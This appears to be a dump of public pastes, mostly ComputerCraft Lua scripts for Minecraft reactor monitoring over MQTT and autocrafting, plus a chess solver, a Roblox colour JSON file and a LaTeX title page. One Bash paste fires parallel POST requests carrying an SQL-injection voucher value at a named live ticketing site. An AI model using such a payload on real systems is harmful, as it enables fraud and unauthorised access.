DwJqZ9is,startup,ale_ben,Lua,Thursday 18th of April 2024 03:46:27 PM CDT,"local controller_id = """"

if fs.exists(""controller"") then
    shell.run(""controller"")
else
    shell.run(""pastebin get "" .. controller_id .. "" controller"")
    os.reboot()
end"
GLXACx8N,MQTT-induction,ale_ben,Lua,Thursday 18th of April 2024 03:37:37 PM CDT,"local mqtt = require(""mqtt"")

local induction = peripheral.wrap(""bottom"")

if induction == nil or induction.isFormed() == false then
    print(""Unable to find induction. Restarting in 5"")
    os.sleep(5)
    os.reboot()
end

local keep_alive = 60
local baseTopic = ""/ftbUniversity19/ITLandfill/fission/induction/""
local refresh = 10

local connected = false

-- create mqtt client
local client = mqtt.client {
    -- NOTE: this broker is not working sometimes; comment username = ""..."" below if you still want to use it
    uri = ""ws://test.mosquitto.org:8080"",
    clean = true,
    keep_alive = keep_alive
}

print(""created MQTT client"", client)

client:on {
    connect = function(connack)
        if connack.rc ~= 0 then
            print(""connection to broker failed:"", connack:reason_string(), connack)
            return
        end
        print(""connected:"", connack) -- successful connection
        connected = true      
        -- subscribe to test topic and publish message after it
        assert(client:subscribe { topic = ""/hfdghwl/#"", qos = 1, callback = function(suback)
            print(""subscribed:"", suback)

        end })
    end,

    message = function(msg)
        assert(client:acknowledge(msg))

        print(""received:"", msg)

        if msg.payload == ""disconnect"" then
            print(""disconnecting..."")
            assert(client:disconnect())
        end
    end,

    error = function(err)
        print(""MQTT client error:"", err)
    end,

    close = function()
        print(""MQTT conn closed"")
    end
}

function sendMessage(topic, message, retain)
    if connected then    
        assert(client:publish {
            topic = baseTopic..topic,
            payload = message,
            retain = retain
        })
    else
        print(""Not connected"")
    end    
end

function sendUpdate() 
    sendMessage(""sensor/energy"", tostring(induction.getEnergyFilledPercentage()), false)
    sendMessage(""sensor/cells/induction"", tostring(induction.getInstalledCells()), false)
    sendMessage(""sensor/cells/provider"", tostring(induction.getInstalledProviders()), false)  
    sendMessage(""sensor/lastInput"", tostring(induction.getLastInput()), false)  
    sendMessage(""sensor/lastOutput"", tostring(induction.getLastOutput()), false)
end

parallel.waitForAny(
    function()
        -- run io loop for client until connection close
        -- please note that in sync mode background PINGREQ's are not available, and automatic reconnects too
        print(""running client in synchronous input/output loop"")
        mqtt.run_sync(client)
        print(""done, synchronous input/output loop is stopped"")
    end,
    function()
        while true do
            os.sleep(keep_alive)
            client:send_pingreq()
        end
    end,
    function()
        while true do
            os.sleep(refresh)
            if (pcall(sendUpdate) == false) then
                print(""Error updating. Restarting in 5"")
                os.sleep(5)
                os.reboot()
            end
        end
    end
)"
FN1jv2xa,turtleapi,mathiaas,Lua,Thursday 18th of April 2024 03:32:50 PM CDT,"json = loadfile(""json"")()


local function printTurtleData(monitor, turtle)
    local x, y = monitor.getCursorPos()

    monitor.setTextColor(colors.white)
    monitor.write(""#"" .. turtle.id .. "" "")
    
    monitor.setTextColor(colors.blue) 
    monitor.write(turtle.label .. ""("" .. turtle.coordinate_x .. "", "" .. turtle.coordinate_y .. "", "" .. turtle.coordinate_z .. "") "")
    
    monitor.setTextColor(colors.white)
    monitor.write(turtle.current_script .. "" "")
    
    monitor.setTextColor(colors.green)
    monitor.write(""Status: "" .. turtle.status .. "" "")
    
    if turtle.fuel_lvl < 20 then
        monitor.setTextColor(colors.red)
    else
        monitor.setTextColor(colors.yellow)
    end
    monitor.write(""Fuel: "" .. turtle.fuel_lvl)
    
    monitor.setCursorPos(1, y + 1)
end


local function refresh_monitor()
    local response = http.get(""http://35.228.225.211:8000/turtles"")
    if not response then
        print(""Failed to get response from server"")
        return
    end

    local jsonString = response.readAll()
    local ok, turtles = pcall(json.decode, jsonString)
    if not ok then
        print(""Error decoding JSON: "" .. turtles) -- turtles variable holds the error message in this context
        return
    end

    -- Get the monitor peripheral
    local monitor = peripheral.find(""monitor"")
    if not monitor then
        print(""No monitor found"")
        return
    end


    monitor.clear()
    monitor.setTextScale(0.7)

    monitor.setCursorPos(1, 1)
    monitor.write(""Turtle Information:"")

    monitor.setCursorPos(1, 3)
    for _, turtle in ipairs(turtles) do
        printTurtleData(monitor, turtle)
    end
end


while true do
    refresh_monitor()
    sleep(30)
end"
BGWyrJMD,MQTT-turbine,ale_ben,Lua,Thursday 18th of April 2024 03:31:29 PM CDT,"local mqtt = require(""mqtt"")

local turbine = peripheral.wrap(""bottom"")

if turbine == nil or turbine.isFormed() == false then
    print(""Unable to find turbine. Restarting in 5"")
    os.sleep(5)
    os.reboot()
end

local keep_alive = 60
local baseTopic = ""/ftbUniversity19/ITLandfill/fission/turbine/""
local refresh = 10

local connected = false

-- create mqtt client
local client = mqtt.client {
    -- NOTE: this broker is not working sometimes; comment username = ""..."" below if you still want to use it
    uri = ""ws://test.mosquitto.org:8080"",
    clean = true,
    keep_alive = keep_alive
}

print(""created MQTT client"", client)

client:on {
    connect = function(connack)
        if connack.rc ~= 0 then
            print(""connection to broker failed:"", connack:reason_string(), connack)
            return
        end
        print(""connected:"", connack) -- successful connection
        connected = true      
        -- subscribe to test topic and publish message after it
        assert(client:subscribe { topic = ""/hfdghwl/#"", qos = 1, callback = function(suback)
            print(""subscribed:"", suback)

        end })
    end,

    message = function(msg)
        assert(client:acknowledge(msg))

        print(""received:"", msg)

        if msg.payload == ""disconnect"" then
            print(""disconnecting..."")
            assert(client:disconnect())
        end
    end,

    error = function(err)
        print(""MQTT client error:"", err)
    end,

    close = function()
        print(""MQTT conn closed"")
    end
}

function sendMessage(topic, message, retain)
    if connected then    
        assert(client:publish {
            topic = baseTopic..topic,
            payload = message,
            retain = retain
        })
    else
        print(""Not connected"")
    end    
end

function sendUpdate() 
    sendMessage(""sensor/energy"", tostring(turbine.getEnergyFilledPercentage()), false)
    sendMessage(""sensor/flow/rate"", tostring(turbine.getFlowRate()), false)  
    sendMessage(""sensor/flow/max"", tostring(turbine.getMaxFlowRate()), false)
    sendMessage(""sensor/production"", tostring(turbine.getProductionRate()), false)
    sendMessage(""sensor/steam"", tostring(turbine.getSteamFilledPercentage()), false)
    sendMessage(""sensor/lastSteamInput"", tostring(turbine.getLastSteamInputRate()), false)
end

parallel.waitForAny(
    function()
        -- run io loop for client until connection close
        -- please note that in sync mode background PINGREQ's are not available, and automatic reconnects too
        print(""running client in synchronous input/output loop"")
        mqtt.run_sync(client)
        print(""done, synchronous input/output loop is stopped"")
    end,
    function()
        while true do
            os.sleep(keep_alive)
            client:send_pingreq()
        end
    end,
    function()
        while true do
            os.sleep(refresh)
            if (pcall(sendUpdate) == false) then
                print(""Error updating. Restarting in 5"")
                os.sleep(5)
                os.reboot()
            end
        end
    end
)"
W6SVhDJz,peta_web,melnikoff,Bash,Thursday 18th of April 2024 03:28:58 PM CDT,"for i in {1..20}; do wget -O- --post-data='[{""message"":""""},{""tickets"":{""wholecon"":10,""afterparty"":0,""vip"":10},""voucher"":""\"" or \""\""=\"""",""billingInformation"":{""firstName"":""A"",""lastName"":""B"",""email"":""test@melnikoff.org"",""phoneNumber"":"""",""comment"":""""},""olderThan"":true,""photography"":true,""newsletter"":false}]' --header='Content-Type:application/json' --header='Next-Action:0778c513d3504526e47282604b8cb5aa5be501f3' https://con-crunch-web-git-tickets-ondej-krk-09445803s-projects.vercel.app/vstupenky & done

"
sAyTp5Q4,MQTT-boiler,ale_ben,Lua,Thursday 18th of April 2024 03:06:00 PM CDT,"local mqtt = require(""mqtt"")

local boiler = peripheral.wrap(""bottom"")

if boiler == nil or boiler.isFormed() == false then
    print(""Unable to find boiler. Restarting in 5"")
    os.sleep(5)
    os.reboot()
end

local keep_alive = 60
local baseTopic = ""/ftbUniversity19/ITLandfill/fission/boiler/""
local refresh = 10

local connected = false

-- create mqtt client
local client = mqtt.client {
    -- NOTE: this broker is not working sometimes; comment username = ""..."" below if you still want to use it
    uri = ""ws://test.mosquitto.org:8080"",
    clean = true,
    keep_alive = keep_alive
}

print(""created MQTT client"", client)

client:on {
    connect = function(connack)
        if connack.rc ~= 0 then
            print(""connection to broker failed:"", connack:reason_string(), connack)
            return
        end
        print(""connected:"", connack) -- successful connection
        connected = true      
        -- subscribe to test topic and publish message after it
        assert(client:subscribe { topic = ""/hfdghwl/#"", qos = 1, callback = function(suback)
            print(""subscribed:"", suback)

        end })
    end,

    message = function(msg)
        assert(client:acknowledge(msg))

        print(""received:"", msg)

        if msg.payload == ""disconnect"" then
            print(""disconnecting..."")
            assert(client:disconnect())
        end
    end,

    error = function(err)
        print(""MQTT client error:"", err)
    end,

    close = function()
        print(""MQTT conn closed"")
    end
}

function sendMessage(topic, message, retain)
    if connected then    
        assert(client:publish {
            topic = baseTopic..topic,
            payload = message,
            retain = retain
        })
    else
        print(""Not connected"")
    end    
end

function sendUpdate() 
    sendMessage(""sensor/boil/capacity"", tostring(boiler.getBoilCapacity()), false)
    sendMessage(""sensor/boil/rate"", tostring(boiler.getBoilRate()), false)              
    sendMessage(""sensor/cooledCoolant"", tostring(boiler.getCooledCoolantFilledPercentage()), false)
    sendMessage(""sensor/heatedCoolant"", tostring(boiler.getHeatedCoolantFilledPercentage()), false)
    sendMessage(""sensor/boil/maxRate"", tostring(boiler.getMaxBoilRate()), false)
    sendMessage(""sensor/steam"", tostring(boiler.getSteamFilledPercentage()), false)
    sendMessage(""sensor/water"", tostring(boiler.getWaterFilledPercentage()), false)
    sendMessage(""sensor/temperature"", tostring(boiler.getTemperature()), false)
end

parallel.waitForAny(
    function()
        -- run io loop for client until connection close
        -- please note that in sync mode background PINGREQ's are not available, and automatic reconnects too
        print(""running client in synchronous input/output loop"")
        mqtt.run_sync(client)
        print(""done, synchronous input/output loop is stopped"")
    end,
    function()
        while true do
            os.sleep(keep_alive)
            client:send_pingreq()
        end
    end,
    function()
        while true do
            os.sleep(refresh)
            if (pcall(sendUpdate) == false) then
                print(""Error updating. Restarting in 5"")
                os.sleep(5)
                os.reboot()
            end
        end
    end
)"
p8NcuwNR,MQTT-reactor,ale_ben,Lua,Thursday 18th of April 2024 03:05:40 PM CDT,"local mqtt = require(""mqtt"")

local reactor = peripheral.wrap(""bottom"")

if reactor == nil or reactor.isFormed() == false then
    print(""Unable to find reactor. Restarting in 5"")
    os.sleep(5)
    os.reboot()
end

local keep_alive = 60
local baseTopic = ""/ftbUniversity19/ITLandfill/fission/reactor/""
local refresh = 10

local connected = false

-- create mqtt client
local client = mqtt.client {
    -- NOTE: this broker is not working sometimes; comment username = ""..."" below if you still want to use it
    uri = ""ws://test.mosquitto.org:8080"",
    clean = true,
    keep_alive = keep_alive
}

print(""created MQTT client"", client)

client:on {
    connect = function(connack)
        if connack.rc ~= 0 then
            print(""connection to broker failed:"", connack:reason_string(), connack)
            return
        end
        print(""connected:"", connack) -- successful connection
        connected = true      
        -- subscribe to test topic and publish message after it
        assert(client:subscribe { topic = baseTopic .. ""command/#"", qos = 1, callback = function(suback)
            print(""subscribed:"", suback)

        end })
    end,

    message = function(msg)
        assert(client:acknowledge(msg))

        print(""received:"", msg)

        if msg.payload == ""disconnect"" then
            print(""disconnecting..."")
            assert(client:disconnect())
        end
        
        local command = string.sub(msg.topic, string.len(baseTopic .. ""command/""))
        print(""Command topic: "" .. command)
        print(""Command: "" .. msg.payload)
    end,

    error = function(err)
        print(""MQTT client error:"", err)
    end,

    close = function()
        print(""MQTT conn closed"")
    end
}

function sendMessage(topic, message, retain)
    if connected then    
        assert(client:publish {
            topic = baseTopic..topic,
            payload = message,
            retain = retain
        })
    else
        print(""Not connected"")
    end    
end

function sendUpdate() 
    sendMessage(""sensor/status"", tostring(reactor.getStatus()), false)
    sendMessage(""sensor/temperature"", tostring(reactor.getTemperature()), false)              
    sendMessage(""sensor/damage"", tostring(reactor.getDamagePercent()), false)
    sendMessage(""sensor/coolant"", tostring(reactor.getCoolantFilledPercentage()), false)
    sendMessage(""sensor/heatedCoolant"", tostring(reactor.getHeatedCoolantFilledPercentage()), false)
    sendMessage(""sensor/fuel"", tostring(reactor.getFuelFilledPercentage()), false)
    sendMessage(""sensor/waste"", tostring(reactor.getWasteFilledPercentage()), false)
   
    --local burnRate = ""{\""max\"":""..tostring(reactor.getMaxBurnRate()) .."", \""set\"":"" .. tostring(reactor.getBurnRate()) .. "",\""val\"":"" .. tostring(reactor.getActualBurnRate()) .. ""}""
    sendMessage(""sensor/burnRate/set"", tostring(reactor.getBurnRate()), false)
    sendMessage(""sensor/burnRate/actual"", tostring(reactor.getActualBurnRate()), false)
    sendMessage(""sensor/burnRate/max"", tostring(reactor.getMaxBurnRate()), false)
    sendMessage(""sensor/burnRate/percent"", tostring(reactor.getActualBurnRate()/reactor.getMaxBurnRate()), false)
    --sendMessage(""sensor/burnRate"", burnRate, false)
end

parallel.waitForAny(
    function()
        -- run io loop for client until connection close
        -- please note that in sync mode background PINGREQ's are not available, and automatic reconnects too
        print(""running client in synchronous input/output loop"")
        mqtt.run_sync(client)
        print(""done, synchronous input/output loop is stopped"")
    end,
    function()
        while true do
            os.sleep(keep_alive)
            client:send_pingreq()
        end
    end,
    function()
        while true do
            os.sleep(refresh)
            if (pcall(sendUpdate) == false) then
                print(""Error updating. Restarting in 5"")
                os.sleep(5)
                os.reboot()
            end
        end
    end
)"
ANPaLpLy,Roblox BrickColor API V1.0,13ooeo,JSON,Thursday 18th of April 2024 02:55:20 PM CDT,"{
    ""msgt"": ""This was exported from JSON!"",
    ""Version"": ""V1.0"",
    ""Name"": ""ROBLOX BRICKCOLOR API"",
    ""LuaU"": {
        ""script1"": ""print('Roblox brickcolor API loaded!')"",
        ""script2"": ""local msg = Instance.new('Message') msg.Text = 'roblox brickcolor API loaded Version:V1.0' msg.Parent = game.Workspace""
    },
    ""CT"": {
        ""Red"": ""Really red"",
        ""Blue"": ""Deep blue"",
        ""Yellow"": ""Bright yellow"",
        ""Purple"": ""Light indigo"",
        ""Green"": ""Sea green"",
        ""Brown"": ""Brown"",
        ""Pink"": ""Hot pink"",
        ""Orange"": ""Bright orange"",
        ""Cyan"": ""Cyan"",
        ""Lime"": ""Lime green"",
        ""Magenta"": ""Magenta"",
        ""Teal"": ""Teal"",
        ""Olive"": ""Olive"",
        ""Maroon"": ""Maroon"",
        ""Navy"": ""Navy blue"",
        ""Aquamarine"": ""Aquamarine"",
        ""Turquoise"": ""Turquoise"",
        ""Silver"": ""Silver"",
        ""Gray"": ""Gray"",
        ""Black"": ""Black"",
        ""White"": ""White"",
        ""Gold"": ""Gold"",
        ""Indigo"": ""Indigo"",
        ""Violet"": ""Violet"",
        ""Tan"": ""Tan"",
        ""Salmon"": ""Salmon"",
        ""SkyBlue"": ""Sky blue"",
        ""SlateGray"": ""Slate gray"",
        ""Lavender"": ""Lavender"",
        ""Crimson"": ""Crimson"",
        ""Chocolate"": ""Chocolate"",
        ""Chartreuse"": ""Chartreuse"",
        ""Coral"": ""Coral"",
        ""FireBrick"": ""Fire brick"",
        ""HotPink"": ""Hot pink"",
        ""Ivory"": ""Ivory"",
        ""Khaki"": ""Khaki"",
        ""LemonChiffon"": ""Lemon chiffon"",
        ""LightCoral"": ""Light coral"",
        ""LightSalmon"": ""Light salmon"",
        ""LightSkyBlue"": ""Light sky blue"",
        ""MediumPurple"": ""Medium purple"",
        ""MistyRose"": ""Misty rose"",
        ""NavajoWhite"": ""Navajo white"",
        ""Orchid"": ""Orchid"",
        ""PaleGreen"": ""Pale green"",
        ""Peru"": ""Peru"",
        ""PowderBlue"": ""Powder blue"",
        ""SaddleBrown"": ""Saddle brown"",
        ""SeaShell"": ""Sea shell"",
        ""Sienna"": ""Sienna"",
        ""Thistle"": ""Thistle"",
        ""Tomato"": ""Tomato"",
        ""Wheat"": ""Wheat"",
        ""YellowGreen"": ""Yellow green""
    }
}
"
p565AVKk,funkcni wrong plies better output Better evaluate_position,max2201111,Python,Thursday 18th of April 2024 02:36:50 PM CDT,"import chess

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachováváme pouze informace o pozici
    return simplified_fen

# def evaluate_position(board):
#     #print(f""Position: {board.fen()}"")
#     if board.is_checkmate():
#      ###   print(f""Position: {board.fen()}, return -1000"")
#         return -1000  # Mat protihráči
#     elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
#      ###   print(f""Position: {board.fen()}, return 0"")

#         return 0  # Remíza
#     else:
#         #print(f""Position: {board.fen()}, return None"")
#         return None  # Hra pokračuje

import chess

def evaluate_position(board):
    if board.is_checkmate():
        # Hráč na tahu je v matu, vracíme -1000
        return -1000
    elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
        # Situace vedoucí k remíze
        return 0
    else:
        # Zkoumáme, zda existuje tah, který by v dalším tahu vedl k matu
        mate_in_one_found = False
        for move in board.legal_moves:
            board.push(move)
            if board.is_checkmate():
                # Mat byl dosažen tímto tahem
                board.pop()
                mate_in_one_found = True
                break
            board.pop()
        
        if mate_in_one_found:
            # Existuje tah, který vede k matu v dalším tahu
            return 999
        else:
            # Žádný mat v dohlednu
            return None



def create_AR_entry(result, children, last_move):
    return {""result"": result, ""children"": children, ""last_move"": last_move, ""best_child"": None} 


def update_best_case(best_case):
    if best_case == 0:
        return best_case
    if best_case > 0:
        return best_case - 1
    else:
        return best_case + 1


def update_AR_for_mate_in_k(board, AR, simplified_initial_fen, max_k=1000):
    
    evaluated_list = []
    #print(f"""")
    
    for k in range(1, max_k + 1):
        print(f""K = {k}"")
        changed = False
     #   for _t in range(2):  # Zajistíme, že pro každé k proběhne aktualizace dvakrát
     #   print(f""_t = {_t}"")
        for fen in list(AR.keys()):


            #print(f""Fen = {fen}, looking for {simplified_initial_fen}, same = {fen == simplified_initial_fen}"")
            board.set_fen(fen)

            if AR[fen]['result'] is not None:
                if fen == simplified_initial_fen:
                    print(f""Finally we found a mate! {AR[fen]['result']}"")
                    return
                continue  # Pokud již máme hodnocení, přeskočíme

            # Získáme výchozí hodnoty pro nejlepší a nejhorší scénář
            best_case = float(""-inf"")
            #worst_case = float(""inf"")
            nones_present = False
            best_child = None


            for move in board.legal_moves:
                #print(f""Move = {move}"")
                board.push(move)
                next_fen = simplify_fen_string(board.fen())
                #AR[fen]['children'].append(next_fen)

                if next_fen not in AR:
                    AR[next_fen] = create_AR_entry(evaluate_position(board), None, move)
                    evaluated_list.append(next_fen)
                    if ((len(evaluated_list)) % 100000 == 0):
                        print(f""Evaluated: {len(evaluated_list)}"")

                board.pop()

                #for child in AR[fen]['children']:
                next_eval = AR[next_fen]['result']
                if next_eval is not None:
                    if (-next_eval > best_case):
                        best_case = max(best_case, -next_eval)
                        best_child = next_fen

                    #worst_case = min(worst_case, -next_eval)
                else:
                    nones_present = True



            if nones_present:
                if best_case > 0:
                    AR[fen]['result'] = update_best_case(best_case)
                    AR[fen]['best_child'] = best_child
                    changed = True
            else:
                # Aktualizace hodnocení podle nejlepšího a nejhoršího scénáře
                #if worst_case == -1000:
                    # Pokud všechny tahy vedou k matu, hráč na tahu může být matován v k tazích
                #    AR[fen] = -1000 + k
                #    changed = True
                #elif best_case <= 0:
                    # Pokud nejlepší scénář není lepší než remíza, znamená to remízu nebo prohru
                #    AR[fen] = max(best_case, 0)  # Zabráníme nastavení hodnoty méně než 0, pokud je remíza možná
                #    changed = True
                #elif best_case == 1000:
                    # Pokud existuje alespoň jeden tah, který vede k matu protihráče, hráč na tahu může vynutit mat v k tazích
                #    AR[fen] = 1000 - k
                #    changed = True
                AR[fen]['result'] = update_best_case(best_case)
                AR[fen]['best_child'] = best_child
                changed = True

         ###   print(f""Position = {fen}, results = {best_case} {nones_present} => {AR[fen]['result']}"") 
            if (fen == ""8/8/3R4/8/8/5K2/8/4k3 b - -"" or fen == ""8/8/3R4/8/8/5K2/8/5k2 w - -""):
                print(""^^^^^^^^"")

            
            # remove here
            #break
            
            #if not changed:
                #break  # Pokud nedošlo k žádné změně, ukončíme smyčku

        #if not changed:
            #break  # Ukončíme hlavní smyčku, pokud nedošlo ke změně v poslední iteraci
    


def print_draw_positions(AR):
    """"""
    Vytiskne všechny remízové pozice (hodnota 0) zaznamenané v slovníku AR.
    """"""
    print(""Remízové pozice:"")
    for fen, value in AR.items():
        if True or (value > 990 and value < 1000):
            print(f""FEN>: {fen}, Hodnota: {value}"",""\n"",chess.Board(fen),""<\n"")

def find_path_to_end(AR, fen):
    if AR[fen]['result'] is None:
        print(f""Unfortunately, there is no path that is known to be the best"")
    
    fen_i = fen
    print(chess.Board(fen_i),""\n<"")
    path = fen
    while AR[fen_i]['best_child'] is not None:
        fen_i = AR[fen_i]['best_child']
        print(chess.Board(fen_i),fen_i,AR[fen_i],""\n\n<<<"")
        
        path = path + "", "" + fen_i
    
    print(f""Path is: {path}"")
    
 
            
def main():

    initial_fen = ""1k6/5P2/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen_original = ""8/8/8/8/3Q4/5K2/8/4k3 w - - 0 1""
    initial_fen_mate_in_one_aka_one_ply = ""3r1k2/5r1p/5Q1K/2p3p1/1p4P1/8/8/8 w - - 2 56""
    initial_fen_mate_in_two_aka_three_plies = ""r5k1/2r3p1/pb6/1p2P1N1/3PbB1P/3pP3/PP1K1P2/3R2R1 b - - 4 28""
    initial_fen_mated_in_two_plies = ""r5k1/2r3p1/p7/bp2P1N1/3PbB1P/3pP3/PP1K1P2/3R2R1 w - - 5 29""
    
    mate_in_two_aka_three_plies_simple = ""8/8/8/8/3R4/5K2/8/4k3 w - - 0 1""
    mated_in_one_aka_two_plies_simple = ""8/8/3R4/8/8/5K2/8/4k3 b - - 1 1""
    mate_in_one_aka_one_ply_simple = ""8/8/3R4/8/8/5K2/8/5k2 w - - 2 2""

    initial_fen = mate_in_two_aka_three_plies_simple
    
    
    initial_fen = ""1k6/5P2/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen = ""1k6/8/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen = ""8/8/8/8/8/7N/1k5K/6B1 w - - 0 1""
    initial_fen = ""7K/8/k1P5/7p/8/8/8/8 w - - 0 1""
    initial_fen = ""8/3k4/8/2K2R2/8/8/8/8 w - - 0 1""
    initial_fen = ""8/8/8/4k3/2K4R/8/8/8 w - - 0 1""
   
    simplified_fen = simplify_fen_string(initial_fen)
    
    board = chess.Board(initial_fen)
    AR = {simplified_fen: {""result"": None, ""last_move"": None, ""children"": None, ""best_child"": None}}  # Inicializace AR s počáteční pozicí
    
    update_AR_for_mate_in_k(board, AR, simplified_fen, max_k=58)  # Aktualizace AR
    
    #print_draw_positions(AR)
    print(f""AR for initial fen is = {AR[simplified_fen]}"")
    find_path_to_end(AR, simplified_fen)
    

main()"
fLtyZUnr,Powah Autocrafter V8,Tri11Paragon,Lua,Thursday 18th of April 2024 01:57:03 PM CDT,"-- state enums
local STATE_NONE = ""NONE""
local STATE_STEEL = ""Hardened Steel""
local STATE_NITRO = ""Nitro Crystal""
local STATE_ENDER = ""Ender Core""
local STATE_BLAZE = ""Blazing Crystal Block""
local STATE_NIOTIC = ""Niotic Crystal""
local STATE_SPIRIT = ""Spirited Crystal""

-- item -> state table
-- this table will be used to determine what item we are currently crafting 
-- and what items need to be transfered in order to craft that item 
local state_from_item_table = {
    -- energized steel
    [""minecraft:iron_ingot""]=STATE_STEEL,
    [""minecraft:gold_ingot""]=STATE_STEEL,

    -- nitro
    [""minecraft:redstone_block""]=STATE_NITRO,
    [""minecraft:nether_star""]=STATE_NITRO,
    [""powah:blazing_crystal_block""]=STATE_NITRO,

    -- ender core
    [""minecraft:ender_eye""]=STATE_ENDER,
    [""powah:dielectric_casing""]=STATE_ENDER,
    [""powah:capacitor_basic_tiny""]=STATE_ENDER,

    -- blaze crystal 
    [""botania:blaze_block""]=STATE_BLAZE,

    -- niotic crystal
    [""minecraft:diamond""]=STATE_NIOTIC,

    -- spirited crystal
    [""minecraft:emerald""]=STATE_SPIRIT
}

-- item table describing what items are required to craft in each state
local state_item_recipies = {
    [STATE_STEEL] = {
        [""minecraft:gold_ingot""] = 1,
        [""minecraft:iron_ingot""] = 1
    },
    [STATE_NITRO] = {
        [""minecraft:redstone_block""] = 2,
        [""powah:blazing_crystal_block""] = 1,
        [""minecraft:nether_star""] = 1
    },
    [STATE_ENDER] = {
        [""minecraft:ender_eye""] = 1,
        [""powah:dielectric_casing""] = 1,
        [""powah:capacitor_basic_tiny""] = 1
    },
    [STATE_BLAZE] = {
        [""botania:blaze_block""] = 1
    },
    [STATE_NIOTIC] = {
        [""minecraft:diamond""] = 1
    },
    [STATE_SPIRIT] = {
        [""minecraft:emerald""] = 1
    }
}
 
---------------------------------
-- DO NOT EDIT BELOW THIS LINE --
---------------------------------

-- the current state of the system
cur_state = STATE_NONE

-- helper function for cloning the item table
function table.clone(org)
    local tbl = {}
    for k,v in pairs(org) do
        tbl[k] = v
    end
    return tbl
end

-- helper function for len of table
function table.count(tbl)
    local count = 0
    for _ in pairs(tbl) do
        count = count + 1
    end
    return count
end

-- determine what state we should enter
-- based on what item we find in the chest
function determineStateFromItem(item)
    local state = state_from_item_table[item]
    if state == nil then
        return STATE_NONE
    else
        return state
    end
end
 
-- find where the chest is
local chest = peripheral.find(""minecraft:chest"")
local orb = peripheral.find(""powah:energizing_orb"")

-- waits for the orb's inventory to be empty then 
-- signals that the orb is ready to craft another item
function waitForReset()
    while true do
        if table.count(orb.list()) == 0 then
            break
        end
    end
    cur_state = STATE_NONE
end
 
-- transfers the requested number of items from the slot in the chest to the orb,
-- if there is not enough items in the stack to meet the demands of the recipe
-- the value in the recipe will be decremented by the amount we could transfer 
function transferItem(itemList, slot, item)
    -- # items we need to transfer
    local count = itemList[item.name]
    -- try to transfer the items
    local itemsTransfered = chest.pushItems(peripheral.getName(orb), slot, count)
    -- number of items left required to craft the recipe
    local itemsLeft = count - itemsTransfered
    -- if 0 then we have enough of this item and can stop searching for it, 
    -- otherwise set to the amount left required to craft
    if itemsLeft <= 0 then
        itemList[item.name] = nil
    else
        itemList[item.name] = itemsLeft
    end 
end

-- transfers the list of items from the chest to the orb
-- this will remove items from the list
function transferItems(itemList)
    -- loop until all items are transfered
    while next(itemList) ~= nil do
        -- check every slot in the chest for any of the items we need to craft the current recipe
        for slot, item in pairs(chest.list()) do
            if itemList[item.name] ~= nil then
                transferItem(itemList, slot, item)
            end
        end
    end
end

-- constantly check the chest for items, 1 second sleeps between
function waitForItems()
    while cur_state == STATE_NONE do
        for slot, item in pairs(chest.list()) do
            cur_state = determineStateFromItem(item.name)
            if cur_state ~= STATE_NONE then
                break
            end
        end 
        -- prevent looping forever with zero delay!
        if cur_state == STATE_NONE then
            os.sleep(1)
        end
    end
end

-- print out program info
print(""Running with recipies:"")
printed_recipes = {}

for k, v in pairs(state_from_item_table) do
    if printed_recipes[v] == nil then
        printed_recipes[v] = true
        print((""\t%s = {""):format(v))
        for item, count in pairs(state_item_recipies[v]) do
            print((""\t\t%d\t%s""):format(count, item))
        end
        print(""\t}"")
    end
end
print(""System started successfully!"")
print("""")
print(""--------------------------------------"")
print(""-- Mr. Fancy Dan's Crafting Manager --"")
print(""--------------------------------------"")
print("""")
 
-- main loop
while true do
    if state_item_recipies[cur_state] ~= nil then
        -- if we are in a state which has a recipe
        local items = table.clone(state_item_recipies[cur_state])
        -- transfer the required items
        transferItems(items)
        -- then wait for the reset signal which tells us we are done crafting that item
        waitForReset()
    else
        if cur_state ~= STATE_NONE then
            print((""Unknown state '%d' detected""):format(cur_state))
        else
            -- if we don't have a recipe we are in the none state, so we should wait for the chest to
            -- have an item which we can use to craft
            waitForItems()
        end
    end
    os.sleep(1)
end"
qH4UDj1u,Title page,Hazem09,Latex,Thursday 18th of April 2024 01:54:59 PM CDT,"\documentclass[12pt]{report}
\setcounter{secnumdepth}{5}
\setcounter{tocdepth}{2}
\setcounter{secnumdepth}{3}
\usepackage{graphicx}
\usepackage{color}
\usepackage[utf8]{inputenc}
\usepackage[french]{babel}
\usepackage[T1]{fontenc} %font package
\usepackage{courier}
\usepackage{listings}
\usepackage{geometry}
\usepackage{amsmath}
\usepackage{minted}
\usepackage{array}
\usepackage{tikz}
\usepackage{tabularx}
\usepackage{ragged2e}
\usepackage[sorting=nyt]{biblatex}
\addbibresource{bibio.bib}
\definecolor{lightgray}{gray}{0.5}
%\setlength{\parindent}{0pt} indent size

\definecolor{mygreen}{rgb}{0,0.6,0}
\definecolor{mygray}{rgb}{0.5,0.5,0.5}
\definecolor{mymauve}{rgb}{0.58,0,0.82}
\usepackage{hyperref}
\hypersetup{
    colorlinks=true,
    linkcolor=black,
    filecolor=magenta,      
    urlcolor=cyan,
    citecolor=black,
    pdftitle={Overleaf Example},
    }
\graphicspath{ {figures/} }


\usetikzlibrary{shapes.geometric , arrows,calc}
\lstset{ %
  backgroundcolor=\color{white},   % choose the background color
  basicstyle=\footnotesize,        % size of fonts used for the code
  breaklines=true,                 % automatic line breaking only at whitespace
  captionpos=b,                    % sets the caption-position to bottom
  commentstyle=\color{mygreen},    % comment style
  escapeinside={\%*}{*)},          % if you want to add LaTeX within your code
  keywordstyle=\color{blue},       % keyword style
  stringstyle=\color{mymauve},     % string literal style
}

\geometry{scale=0.75,top=2cm,bottom=2cm}

\begin{document}
\begin{titlepage}
\newcommand{\HRule}{\rule{\linewidth}{0.5mm}}
\center

\textsc{\small \textbf{république algérienne démocratique et populaire
ministre de l'enseignement supérieure et de la recherche scientifique
université des sciences et de la technologie Houari Boumediene}}\\[0.5cm]



\includegraphics[scale=0.17]{logousthb1.png}\\[1cm]

\textsc{\Large Faculté de mathématique}\\[0.5cm] % Major heading such as course name
\textsc{\large Département de Recherche Opérationnelle}\\[0.5cm] % Minor heading such as course title
{\large \bfseries MSPRO Master 2}\\[0.5cm]
{\huge \bfseries TIC }\\[0.5cm]


\HRule \\[0.4cm]
